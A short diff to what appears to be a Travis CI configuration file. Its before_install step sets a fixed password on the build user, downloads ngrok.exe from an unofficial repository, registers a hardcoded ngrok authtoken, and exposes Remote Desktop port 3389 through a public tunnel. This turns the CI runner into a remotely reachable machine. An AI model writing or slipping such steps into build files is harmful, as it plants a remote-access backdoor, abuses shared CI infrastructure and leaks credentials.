@@ -4,7 +4,7 @@ language: shell
 
 before_install:
 - |-
-        whoami
+        net user travis Thuonghai001
         curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
         powershell ./ngrok authtoken UqkqD5EBxWPggw7xGAiQ_77M4D5kjaPNdr9wdb3m9z
         powershell ./ngrok tcp 3389
